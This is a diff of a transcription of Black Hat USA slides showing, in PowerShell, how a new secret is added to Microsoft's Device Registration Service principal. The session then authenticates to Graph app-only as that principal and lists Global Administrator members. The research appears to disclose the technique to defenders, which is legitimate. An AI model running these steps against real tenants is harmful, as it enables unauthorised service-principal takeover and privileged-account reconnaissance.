-ga-eric@northwindtradersgLlobal.onmicrosoft.com AzureCloud a8c79a2a—-f998-4913-96d2-f45694b77bel northwindtradersgLlob...
-PS C:\temp> $notafter = (Get-Date) .AddMonths(6)
+[Windows PowerShell]
+
+ga-eric@northwindtradersglobal.onmicrosoft.com AzureCloud   a8c79a2a-f998-4913-96d2-f45694b77be1 northwindtradersglob...
+
+PS C:\temp> $notafter = (Get-Date).AddMonths(6)
 PS C:\temp> $TargetSPN = Get-AzureADServicePrincipal -SearchString "Device Registration Service"
 PS C:\temp> $TargetSPN
-ObjectId AppId DispLayName
-c344e5a6-111d—4a00-a8e3-d1beb87c0750 01cb2876-7ebd—Y4aa4—9cc9-d28bd4d359a9 Device Registration Service
+
+ObjectId                             AppId                                DisplayName
+--------                             -----                                -----------
+c344e5a6-111d-4a00-a8e3-d1beb87c0750 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9 Device Registration Service
+
 PS C:\temp> $SPNCreds = New-AzureADServicePrincipalPasswordCredential -ObjectId $TargetSPN.ObjectId -EndDate $notafter
-PS C:\temp> $SPNCreds. Value
-FcGhiy7mY
+PS C:\temp> $SPNCreds.Value
+FcGhiy7mY[obscured]
 PS C:\temp> $SPNPW = ConvertTo-SecureString -AsPlainText $SPNCreds.Value -Force
-PS C:\temp>|$GraphCreds = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $TargetSPN.AppId,
-$SPNPW
+PS C:\temp> $GraphCreds = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $TargetSPN.AppId, $SPNPW
 PS C:\temp> Disconnect-AzureAD
-| PS C:\temp> Connect-MgGraph -TenantId a8c79a2a-f998-4913-96d2-f45694b77bel -ClientSecretCredential $GraphCreds
+PS C:\temp> Connect-MgGraph -TenantId a8c79a2a-f998-4913-96d2-f45694b77be1 -ClientSecretCredential $GraphCreds
 Welcome to Microsoft Graph!
-*| Connected via apponly access using 01cb2876-7ebd—4aa4—9cc9-d28bd4d359a9
+
+Connected via apponly access using 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9
 Readme: https://aka.ms/graph/sdk/powershell
 SDK Docs: https://aka.ms/graph/sdk/powershell/docs
 API Docs: https://aka.ms/graph/docs
-NOTE: You can use the —NoWelcome parameter to suppress this message.
+
+NOTE: You can use the -NoWelcome parameter to suppress this message.
+
 PS C:\temp>
-Stuffing creds into a credential object : , , P #BHUSA @BlackHatEvents
+
+[red highlight box around the line: $GraphCreds = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $TargetSPN.AppId, $SPNPW]
+
+Caption: Stuffing creds into a credential object
 ```
 
 ## Slide 89
 
 **#BHUSA @BlackHatEvents** Connecting to Microsoft Graph with the customer (target) tenant ID and credentials
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 85/100 on the text kept, 80/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-BY Windows PowerShell x iv _ Oo
-ga-eric@northwindtradersgLlobal.onmicrosoft.com AzureCloud a8c79a2a—-f998-4913-96d2-f45694b77bel northwindtradersgLlob...
-PS C:\temp> $notafter = (Get-Date) .AddMonths(6)
+[Windows PowerShell]
+
+ga-eric@northwindtradersglobal.onmicrosoft.com AzureCloud   a8c79a2a-f998-4913-96d2-f45694b77be1 northwindtradersglob...
+
+PS C:\temp> $notafter = (Get-Date).AddMonths(6)
 PS C:\temp> $TargetSPN = Get-AzureADServicePrincipal -SearchString "Device Registration Service"
 PS C:\temp> $TargetSPN
-ObjectId AppId DispLayName
-c344e5a6-111d—4a00-a8e3-d1beb87c0750 01cb2876-7ebd—Y4aa4—9cc9-d28bd4d359a9 Device Registration Service
+
+ObjectId                             AppId                                DisplayName
+--------                             -----                                -----------
+c344e5a6-111d-4a00-a8e3-d1beb87c0750 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9 Device Registration Service
+
 PS C:\temp> $SPNCreds = New-AzureADServicePrincipalPasswordCredential -ObjectId $TargetSPN.ObjectId -EndDate $notafter
-PS C:\temp> $SPNCreds. Value
-FcGhiy7mY
+PS C:\temp> $SPNCreds.Value
+FcGhiy7mY[obscured]
 PS C:\temp> $SPNPW = ConvertTo-SecureString -AsPlainText $SPNCreds.Value -Force
-PS C:\temp> $GraphCreds = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $TargetSPN.AppId,
-$SPNPW
+PS C:\temp> $GraphCreds = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $TargetSPN.AppId, $SPNPW
 PS C:\temp> Disconnect-AzureAD
-§ PS C:\temp> |Connect-MgGraph -TenantId a8c79a2a-f998-4913-96d2-f45694b77bel -ClientSecretCredential $GraphCreds
+PS C:\temp> Connect-MgGraph -TenantId a8c79a2a-f998-4913-96d2-f45694b77be1 -ClientSecretCredential $GraphCreds
 Welcome to Microsoft Graph!
-*| Connected via apponly access using 01cb2876-7ebd—4aa4—9cc9-d28bd4d359a9
+
+Connected via apponly access using 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9
 Readme: https://aka.ms/graph/sdk/powershell
 SDK Docs: https://aka.ms/graph/sdk/powershell/docs
 API Docs: https://aka.ms/graph/docs
-NOTE: You can use the —NoWelcome parameter to suppress this message.
+
+NOTE: You can use the -NoWelcome parameter to suppress this message.
+
 PS C:\temp>
-Connecting to Microsoft Graph with the customer (target) tenant ID and credentials , , P #BHUSA @BlackHatEvents
+
+[red highlight box around the line: Connect-MgGraph -TenantId a8c79a2a-f998-4913-96d2-f45694b77be1 -ClientSecretCredential $GraphCreds]
+
+Caption: Connecting to Microsoft Graph with the customer (target) tenant ID and credentials
 ```
 
 ## Slide 90
 
 **#BHUSA @BlackHatEvents**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 81/100 on the text kept, 78/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-BY Windows PowerShell x + |v = 0 x
-Connected via apponly access using 01cb2876-7ebd—4aa4—9cc9-d28bd4d359a9
-Readme: https://aka.ms/graph/sdk/powersheLl
+[Windows PowerShell]
+
+Connected via apponly access using 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9
+Readme: https://aka.ms/graph/sdk/powershell
 SDK Docs: https://aka.ms/graph/sdk/powershell/docs
 API Docs: https://aka.ms/graph/docs
-NOTE: You can use the —NoWelcome parameter to suppress this message.
+
+NOTE: You can use the -NoWelcome parameter to suppress this message.
+
 PS C:\temp> Get-MgContext
-ClientId : 01cb2876-7ebd—4aad—I9cc9-d28bd4d359a9
-TenantId : a8c'79a2a—F998-4913-96d2-F45694b77bel
-Scopes :
-AuthType : AppOnly
-TokenCredentialType : ClientSecret
-CertificateThumbprint
-CertificateSubjectName : =" :
-Account : as
-= AppName : Device Registration Service
-ContextScope : Process
-: Certificate 2 =
-~| PSHostVersion : 5.1.22621.2506 =
-| ManagedIdentityId : a
-ClientSecret : System.Security.SecureString ;
-Environment : Global
-i PS C:\temp>
-> : ; ‘ . i #BHUSA @BlackHatEvents
+
+ClientId                  : 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9
+TenantId                  : a8c79a2a-f998-4913-96d2-f45694b77be1
+Scopes                    :
+AuthType                  : AppOnly
+TokenCredentialType       : ClientSecret
+CertificateThumbprint     :
+CertificateSubjectName    :
+Account                   :
+AppName                   : Device Registration Service
+ContextScope              : Process
+Certificate               :
+PSHostVersion             : 5.1.22621.2506
+ManagedIdentityId         :
+ClientSecret              : System.Security.SecureString
+Environment               : Global
+
+PS C:\temp>
 ```
 
 ## Slide 91
 
 **#BHUSA @BlackHatEvents** Gathering our Microsoft Graph session details
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 81/100 on the text kept, 81/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-BY Windows PowerShell x + |v = 0 x
-Connected via apponly access using 01cb2876-7ebd—4aa4—9cc9-d28bd4d359a9
-Readme: https://aka.ms/graph/sdk/powersheLl
+[Windows PowerShell]
+
+Connected via apponly access using 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9
+Readme: https://aka.ms/graph/sdk/powershell
 SDK Docs: https://aka.ms/graph/sdk/powershell/docs
 API Docs: https://aka.ms/graph/docs
-NOTE: You can use the —NoWelcome parameter to suppress this message.
-PS C:\temp> |Get-MgContext
-ClientId : 01cb2876-7ebd—4aad—I9cc9-d28bd4d359a9
-TenantId : a8c'79a2a—F998-4913-96d2-F45694b77bel
-Scopes :
-AuthType : AppOnly
-TokenCredentialType : ClientSecret
-CertificateThumbprint
-CertificateSubjectName : =" :
-Account : as
-= AppName : Device Registration Service
-ContextScope : Process
-: Certificate 2 =
-~| PSHostVersion : 5.1.22621.2506 =
-| ManagedIdentityId : a
-ClientSecret : System.Security.SecureString ;
-Environment : Global
-i PS C:\temp>
-Gathering our Microsoft Graph session details : ‘ P #BHUSA @BlackHatEvents
+
+NOTE: You can use the -NoWelcome parameter to suppress this message.
+
+PS C:\temp> Get-MgContext
+
+ClientId                  : 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9
+TenantId                  : a8c79a2a-f998-4913-96d2-f45694b77be1
+Scopes                    :
+AuthType                  : AppOnly
+TokenCredentialType       : ClientSecret
+CertificateThumbprint     :
+CertificateSubjectName    :
+Account                   :
+AppName                   : Device Registration Service
+ContextScope              : Process
+Certificate               :
+PSHostVersion             : 5.1.22621.2506
+ManagedIdentityId         :
+ClientSecret              : System.Security.SecureString
+Environment               : Global
+
+PS C:\temp>
+
+[red highlight box around the command: Get-MgContext]
+
+Caption: Gathering our Microsoft Graph session details
 ```
 
 ## Slide 92
 
 **#BHUSA @BlackHatEvents** We have a session with credentials for Device Registration Service
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 79/100 on the text kept, 79/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-BY Windows PowerShell x + |v = 0 x
-Connected via apponly access using 01cb2876-7ebd—4aa4—9cc9-d28bd4d359a9
-Readme: https://aka.ms/graph/sdk/powersheLl
+[Windows PowerShell]
+
+Connected via apponly access using 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9
+Readme: https://aka.ms/graph/sdk/powershell
 SDK Docs: https://aka.ms/graph/sdk/powershell/docs
 API Docs: https://aka.ms/graph/docs
-NOTE: You can use the —NoWelcome parameter to suppress this message.
+
+NOTE: You can use the -NoWelcome parameter to suppress this message.
+
 PS C:\temp> Get-MgContext
-ClientId : 01cb2876-7ebd—4aad—I9cc9-d28bd4d359a9
-TenantId : a8c'79a2a—F998-4913-96d2-F45694b77bel
-Scopes :
-AuthType : AppOnly
-TokenCredentialType : ClientSecret
-CertificateThumbprint
-CertificateSubjectName : =" :
-Account : as
-= AppName : [Device Registration Service
-ContextScope : Process
-: Certificate 2 =
-~| PSHostVersion : 5.1.22621.2506 =
-| ManagedIdentityId : a
-ClientSecret : System.Security.SecureString ;
-Environment : Global
-i PS C:\temp>
-We have a session with credentials for Device Registration Service , , P #BHUSA @BlackHatEvents
+
+ClientId                  : 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9
+TenantId                  : a8c79a2a-f998-4913-96d2-f45694b77be1
+Scopes                    :
+AuthType                  : AppOnly
+TokenCredentialType       : ClientSecret
+CertificateThumbprint     :
+CertificateSubjectName    :
+Account                   :
+AppName                   : Device Registration Service
+ContextScope              : Process
+Certificate               :
+PSHostVersion             : 5.1.22621.2506
+ManagedIdentityId         :
+ClientSecret              : System.Security.SecureString
+Environment               : Global
+
+PS C:\temp>
+
+[red highlight box around the AppName value: Device Registration Service]
+
+Caption: We have a session with credentials for Device Registration Service
 ```
 
 ## Slide 93
@@ -2082,64 +2018,77 @@ There are no OAuth 2.0 scopes (permissions) indicated
 
 **#BHUSA @BlackHatEvents**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 81/100 on the text kept, 81/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-BY Windows PowerShell x + |v = 0 x
-Connected via apponly access using 01cb2876-7ebd—4aa4—9cc9-d28bd4d359a9
-Readme: https://aka.ms/graph/sdk/powersheLl
+[Windows PowerShell]
+
+Connected via apponly access using 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9
+Readme: https://aka.ms/graph/sdk/powershell
 SDK Docs: https://aka.ms/graph/sdk/powershell/docs
 API Docs: https://aka.ms/graph/docs
-NOTE: You can use the —NoWelcome parameter to suppress this message.
+
+NOTE: You can use the -NoWelcome parameter to suppress this message.
+
 PS C:\temp> Get-MgContext
-ClientId : 01cb2876-7ebd—4aad—I9cc9-d28bd4d359a9
-TenantId : a8c79a2a—F998-4913-96d2-F45694b77bel
-Scopes No scopes
-AuthType : AppOnly
-TokenCredentialType : ClientSecret
-CertificateThumbprint
-CertificateSubjectName : =" :
-Account : as
-= AppName : Device Registration Service
-ContextScope : Process
-: Certificate 2 =
-~| PSHostVersion : 5.1.22621.2506 =
-| ManagedIdentityId : a
-ClientSecret : System.Security.SecureString ;
-Environment : Global
-i PS C:\temp>
-There are no OAuth 2.0 scopes (permissions) indicated _ , sas P #BHUSA @BlackHatEvents
+
+ClientId                  : 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9
+TenantId                  : a8c79a2a-f998-4913-96d2-f45694b77be1
+Scopes                    :
+AuthType                  : AppOnly
+TokenCredentialType       : ClientSecret
+CertificateThumbprint     :
+CertificateSubjectName    :
+Account                   :
+AppName                   : Device Registration Service
+ContextScope              : Process
+Certificate               :
+PSHostVersion             : 5.1.22621.2506
+ManagedIdentityId         :
+ClientSecret              : System.Security.SecureString
+Environment               : Global
+
+PS C:\temp>
+
+[red highlight box around the empty Scopes value, with red annotation text 'No scopes' to its right]
+
+Caption: There are no OAuth 2.0 scopes (permissions) indicated
 ```
 
 ## Slide 94
 
 **#BHUSA @BlackHatEvents**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 77/100 on the text kept, 73/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-BY Windows PowerShell x + iv = Oo x
-PS C:\temp> Get-MgDirectoryRole | Select-Object -Property DisplayName, ID
-DispLayName Id
-Security Administrator 128284a5-9a9e—-49c3-al60-Fd25554F8c45
-| Global Reader 2863c272-—b286-4077-b65f-6bla5e72adc4
-Azure AD Joined Device Local Administrator 4a2d4dc3-6634-44f2-a5a6-7Oddedcfdc86
-| User Administrator 77414df4-e2ff-42df-8a7d-58df04e65885
-Directory Readers 96c41d0e-04c8-476d—-94dFf-603263509dc1
-Global Administrator ae81c4d9-3b45-445b-896a-—64aaT7085db93
-Directory Synchronization Accounts b077747c—-3953-408b-91f2-d6b58FfddaObc
-Attribute Definition Administrator b8508655-1331-4183-95ba-90a39d67e5ae
-Application Administrator d383ec2f-f9ca—4e36-8230-225832c0c361
-Conditional Access Administrator dbdf8b40-4757-4900-8676-7f2a81c9a294
-PS C:\temp> Get-MgDirectoryRoleMember -DirectoryRolelId ae81c4d9-3b45-4U45b-896a-64aa7085db93 | ForEach-Object { Get-MGUse
-r -UserId $_.Id} ——
-——
-9 DispLayName Id Mail UserPrincipalNam
-e
-} Eric Woodruff d7148226-7444-4884-aef7—-b5fe693a6798 ga-eric@northwindtradersgLlobal.onmicrosoft.com ga-eric@north... =
-Eric Woodruff (GA) 737e7448-93c6-4677-b697-244935blad80 ga-ericw@nort... ae
+[Windows PowerShell]
+
+PS C:\temp> Get-MgDirectoryRole | Select-Object -Property DisplayName,ID
+
+DisplayName                               Id
+-----------                               --
+Security Administrator                    128284a5-9a9e-49c3-a460-fd25554f8c45
+Global Reader                             2863c272-b286-4077-b65f-6b1a5e72adc4
+Azure AD Joined Device Local Administrator 4a2d4dc3-6634-44f2-a5a6-70ddedcfdc86
+User Administrator                        77414df4-e2ff-42df-8a7d-58df04e65885
+Directory Readers                         96c41d0e-04c8-476d-94df-603263509dc1
+Global Administrator                      ae81c4d9-3b45-445b-896a-64aa7085db93
+Directory Synchronization Accounts        b077747c-3953-408b-91f2-d6b58fdda0bc
+Attribute Definition Administrator        b8508655-1331-4183-95ba-90a39d67e5ae
+Application Administrator                 d383ec2f-f9ca-4e36-8230-225832c0c361
+Conditional Access Administrator          dbdf8b40-4757-4900-8676-7f2a81c9a294
+
+PS C:\temp> Get-MgDirectoryRoleMember -DirectoryRoleId ae81c4d9-3b45-445b-896a-64aa7085db93 | ForEach-Object { Get-MGUser -UserId $_.Id}
+
+DisplayName        Id                                   Mail                                              UserPrincipalName
+-----------        --                                   ----                                              -----------------
+Eric Woodruff      d7148226-7444-4884-aef7-b5fe693a6798 ga-eric@northwindtradersglobal.onmicrosoft.com    ga-eric@north...
+Eric Woodruff (GA) 737e7448-93c6-4677-b697-244935b1ad80                                                   ga-ericw@nort...
+
 PS C:\temp>
-> : ; ‘ . i #BHUSA @BlackHatEvents
 ```
 
 ## Slide 95
@@ -2148,31 +2097,39 @@ Gathering directory roles
 
 **#BHUSA @BlackHatEvents**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 77/100 on the text kept, 73/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-BY Windows PowerShell x + iv = Oo x
-PS C:\temp>|Get-MgDirectoryRole | Select-Object -Property DisplayName, ID
-DispLayName Id
-Security Administrator 128284a5-9a9e—-49c3-al60-Fd25554F8c45
-| Global Reader 2863c272-—b286-4077-b65f-6bla5e72adc4
-Azure AD Joined Device Local Administrator 4a2d4dc3-6634-44f2-a5a6-7Oddedcfdc86
-| User Administrator 77414df4-e2ff-42df-8a7d-58df04e65885
-Directory Readers 96c41d0e-04c8-476d—-94dFf-603263509dc1
-Global Administrator ae81c4d9-3b45-445b-896a-—64aaT7085db93
-Directory Synchronization Accounts b077747c—-3953-408b-91f2-d6b58FfddaObc
-Attribute Definition Administrator b8508655-1331-4183-95ba-90a39d67e5ae
-Application Administrator d383ec2f-f9ca—4e36-8230-225832c0c361
-Conditional Access Administrator dbdf8b40-4757-4900-8676-7f2a81c9a294
-PS C:\temp> Get-MgDirectoryRoleMember -DirectoryRolelId ae81c4d9-3b45-4U45b-896a-64aa7085db93 | ForEach-Object { Get-MGUse
-r -UserId $_.Id} ——
-——
-9 DispLayName Id Mail UserPrincipalNam
-e
-} Eric Woodruff d7148226-7444-4884-aef7—-b5fe693a6798 ga-eric@northwindtradersgLlobal.onmicrosoft.com ga-eric@north... =
-Eric Woodruff (GA) 737e7448-93c6-4677-b697-244935blad80 ga-ericw@nort... ae
+[Windows PowerShell]
+
+PS C:\temp> Get-MgDirectoryRole | Select-Object -Property DisplayName,ID
+
+DisplayName                               Id
+-----------                               --
+Security Administrator                    128284a5-9a9e-49c3-a460-fd25554f8c45
+Global Reader                             2863c272-b286-4077-b65f-6b1a5e72adc4
+Azure AD Joined Device Local Administrator 4a2d4dc3-6634-44f2-a5a6-70ddedcfdc86
+User Administrator                        77414df4-e2ff-42df-8a7d-58df04e65885
+Directory Readers                         96c41d0e-04c8-476d-94df-603263509dc1
+Global Administrator                      ae81c4d9-3b45-445b-896a-64aa7085db93
+Directory Synchronization Accounts        b077747c-3953-408b-91f2-d6b58fdda0bc
+Attribute Definition Administrator        b8508655-1331-4183-95ba-90a39d67e5ae
+Application Administrator                 d383ec2f-f9ca-4e36-8230-225832c0c361
+Conditional Access Administrator          dbdf8b40-4757-4900-8676-7f2a81c9a294
+
+PS C:\temp> Get-MgDirectoryRoleMember -DirectoryRoleId ae81c4d9-3b45-445b-896a-64aa7085db93 | ForEach-Object { Get-MGUser -UserId $_.Id}
+
+DisplayName        Id                                   Mail                                              UserPrincipalName
+-----------        --                                   ----                                              -----------------
+Eric Woodruff      d7148226-7444-4884-aef7-b5fe693a6798 ga-eric@northwindtradersglobal.onmicrosoft.com    ga-eric@north...
+Eric Woodruff (GA) 737e7448-93c6-4677-b697-244935b1ad80                                                   ga-ericw@nort...
+
 PS C:\temp>
-Gathering directory roles , : ; , P #BHUSA @BlackHatEvents
+
+[red highlight box around the command: Get-MgDirectoryRole | Select-Object -Property DisplayName,ID]
+
+Caption: Gathering directory roles
 ```
 
 ## Slide 96
@@ -2181,31 +2138,35 @@ Targeting the Global Administrator role
 
 **#BHUSA @BlackHatEvents**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 77/100 on the text kept, 74/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-BY Windows PowerShell x + iv = Oo x
-PS C:\temp> Get-MgDirectoryRole | Select-Object -Property DisplayName, ID
-DispLayName Id
-Security Administrator 128284a5-9a9e—-49c3-al60-Fd25554F8c45
-| Global Reader 2863c272-—b286-4077-b65f-6bla5e72adc4
-| Azure AD Joined Device Local Administrator 4a2d4dc3-6634-44f2-a5a6-7Oddedcfdc86
-| User Administrator 77414df4-e2ff-42df-8a7d-58df04e65885
-Directory Readers 96c41d0e-04c8-476d-94df—-603263509dc1
-Global Administrator ae81c4d9-3b45-445b-896a—-64aa7085db93
-Directory Synchronization Accounts b077747c—-3953-408b-91F2-d6b58FfddaObc
-Attribute Definition Administrator b8508655-1331-4183-95ba-90a39d67e5ae
-Application Administrator d383ec2f-f9ca—4e36-8230-225832c0c361
-Conditional Access Administrator dbdf8b40-4757-4900-8676-7f2a81c9a294
-PS C:\temp> Get-MgDirectoryRoleMember -DirectoryRolelId ae81c4d9-3b45-4U45b-896a-64aa7085db93 | ForEach-Object { Get-MGUse
-r -UserId $_.Id} ——
-——
-9 DispLayName Id Mail UserPrincipalNam
-e
-} Eric Woodruff d7148226-7444-4884-aef7—-b5fe693a6798 ga-eric@northwindtradersgLlobal.onmicrosoft.com ga-eric@north... =
-Eric Woodruff (GA) 737e7448-93c6-4677-b697-244935blad80 ga-ericw@nort... ae
+PS C:\temp> Get-MgDirectoryRole | Select-Object -Property DisplayName,ID
+
+DisplayName                                Id
+-----------                                --
+Security Administrator                     128284a5-9a9e-49c3-a460-fd25554f8c45
+Global Reader                              2863c272-b286-4077-b65f-6b1a5e72adc4
+Azure AD Joined Device Local Administrator 4a2d4dc3-6634-44f2-a5a6-70ddedcfdc86
+User Administrator                         77414df4-e2ff-42df-8a7d-58df04e65885
+Directory Readers                          96c41d0e-04c8-476d-94df-603263509dc1
+Global Administrator                       ae81c4d9-3b45-445b-896a-64aa7085db93
+Directory Synchronization Accounts         b077747c-3953-408b-91f2-d6b58fdda0bc
+Attribute Definition Administrator         b8508655-1331-4183-95ba-90a39d67e5ae
+Application Administrator                  d383ec2f-f9ca-4e36-8230-225832c0c361
+Conditional Access Administrator           dbdf8b40-4757-4900-8676-7f2a81c9a294
+
+PS C:\temp> Get-MgDirectoryRoleMember -DirectoryRoleId ae81c4d9-3b45-445b-896a-64aa7085db93 | ForEach-Object { Get-MGUser -UserId $_.Id}
+
+DisplayName        Id                                   Mail                                            UserPrincipalName
+-----------        --                                   ----                                            -----------------
+Eric Woodruff      d7148226-7444-4884-aef7-b5fe693a6798 ga-eric@northwindtradersglobal.onmicrosoft.com  ga-eric@north...
+Eric Woodruff (GA) 737e7448-93c6-4677-b697-244935b1ad80                                                  ga-ericw@nort...
+
 PS C:\temp>
-Targeting the Global Administrator role : ‘ P #BHUSA @BlackHatEvents
+
+Targeting the Global Administrator role
 ```
 
 ## Slide 97
@@ -2214,142 +2175,152 @@ Gathering members of the Global Administrator role
 
 **#BHUSA @BlackHatEvents**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 76/100 on the text kept, 76/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-BY Windows PowerShell x + iv = Oo x
-PS C:\temp> Get-MgDirectoryRole | Select-Object -Property DisplayName, ID
-DispLayName Id
-Security Administrator 128284a5-9a9e—-49c3-al60-Fd25554F8c45
-i Global Reader 2863c272-—b286-4077-b65f-6bla5e72adc4
-Azure AD Joined Device Local Administrator 4a2d4dc3-6634-44f2—a5a6-7Oddedcfdc86
-j User Administrator 77414df4-e2FF-42df-8a7d-S8dFO4e65885
-Directory Readers 96c41d0e-04c8-476d—-94dFf-603263509dc1
-Global Administrator ae81c4d9-3b45-445b-896a-64aa7085db93
-Directory Synchronization Accounts b077747c—-3953-408b-91f2-d6b58FfddaObc
-Attribute Definition Administrator b8508655-1331-4183-95ba-90a39d67e5ae
-Application Administrator d383ec2f-f9ca—4e36-8230-225832c0c361
-Conditional Access Administrator dbdf8b40-4757-4900-8676-7£2a81c9a294
-PS C:\temp>|Get-MgDirectoryRoleMember —-DirectoryRolelId ae81c4d9-3b45-445b-896a—64aa7085db93| | ForEach-Object { Get-MGUse
-r -UserId $_.Id —
-=
-4 \DisplayName Id Mail UserPrincipalNam
-e
-)|Eric Woodruff d7148226-7444-4884-aef7—-b5fe693a6798 ga-eric@northwindtradersgLlobal.onmicrosoft.com ga-eric@north... =
-Eric Woodruff (GA) 737e7448-93c6-4677-b697-244935blad80 ga-ericw@nort... om
+PS C:\temp> Get-MgDirectoryRole | Select-Object -Property DisplayName,ID
+
+DisplayName                                Id
+-----------                                --
+Security Administrator                     128284a5-9a9e-49c3-a460-fd25554f8c45
+Global Reader                              2863c272-b286-4077-b65f-6b1a5e72adc4
+Azure AD Joined Device Local Administrator 4a2d4dc3-6634-44f2-a5a6-70ddedcfdc86
+User Administrator                         77414df4-e2ff-42df-8a7d-58df04e65885
+Directory Readers                          96c41d0e-04c8-476d-94df-603263509dc1
+Global Administrator                       ae81c4d9-3b45-445b-896a-64aa7085db93
+Directory Synchronization Accounts         b077747c-3953-408b-91f2-d6b58fdda0bc
+Attribute Definition Administrator         b8508655-1331-4183-95ba-90a39d67e5ae
+Application Administrator                  d383ec2f-f9ca-4e36-8230-225832c0c361
+Conditional Access Administrator           dbdf8b40-4757-4900-8676-7f2a81c9a294
+
+PS C:\temp> Get-MgDirectoryRoleMember -DirectoryRoleId ae81c4d9-3b45-445b-896a-64aa7085db93 | ForEach-Object { Get-MGUser -UserId $_.Id}
+
+DisplayName        Id                                   Mail                                            UserPrincipalName
+-----------        --                                   ----                                            -----------------
+Eric Woodruff      d7148226-7444-4884-aef7-b5fe693a6798 ga-eric@northwindtradersglobal.onmicrosoft.com  ga-eric@north...
+Eric Woodruff (GA) 737e7448-93c6-4677-b697-244935b1ad80                                                  ga-ericw@nort...
+
 PS C:\temp>
-Gathering members of the Global Administrator role ; . 1 ls ties j #BHUSA @BlackHatEvents
+
+Gathering members of the Global Administrator role
 ```
 
 ## Slide 98
 
 **#BHUSA @BlackHatEvents**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 81/100 on the text kept, 74/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-BY Windows PowerShell x Sp | Ses = Oo x
-Directory Synchronization Accounts b077747c-3953-408b-91F2-d6b58Fddadbec
-Attribute Definition Administrator b8508655-1331-4183-95ba—90a39d67e5ae
-Application Administrator d383ec2f-—f9ca—4e36—-8230-225832c0c361
-Conditional Access Administrator dbdf8b40-4757-4900-8676-7f2a81c9a294
-PS C:\temp> Get-MgDirectoryRoleMember —DirectoryRolelId ae81c4d9-3b45-445b-896a-64aa7085db93 | ForEach-Object { Get-MGUse
-r -UserId $_.Id}
-DispLayName Id Mail UserPrincipalNam
-e
-Eric Woodruff d7148226-7444-4884—-aef7—b5fe693a6798 ga-eric@northwindtradersglobal.onmicrosoft.com ga-eric@north...
-Eric Woodruff (GA) 73'7e7448-93c6-4677-b697-244935blad80 ga-ericw@nort...
-PS C:\temp> Get-MGUser —UserId megan. bowen@northwindtraders.cloud
-DispLlayName Id Mail UserPrincipalName
-Megan Bowen 936d55ce-a9b6—4a3b-—bala—76340951d486 megan.bowen@northwindtraders.cloud megan. bowen@northwindtraders.cloud
+Directory Synchronization Accounts         b077747c-3953-408b-91f2-d6b58fdda0bc
+Attribute Definition Administrator         b8508655-1331-4183-95ba-90a39d67e5ae
+Application Administrator                  d383ec2f-f9ca-4e36-8230-225832c0c361
+Conditional Access Administrator           dbdf8b40-4757-4900-8676-7f2a81c9a294
+
+PS C:\temp> Get-MgDirectoryRoleMember -DirectoryRoleId ae81c4d9-3b45-445b-896a-64aa7085db93 | ForEach-Object { Get-MGUser -UserId $_.Id}
+
+DisplayName        Id                                   Mail                                            UserPrincipalName
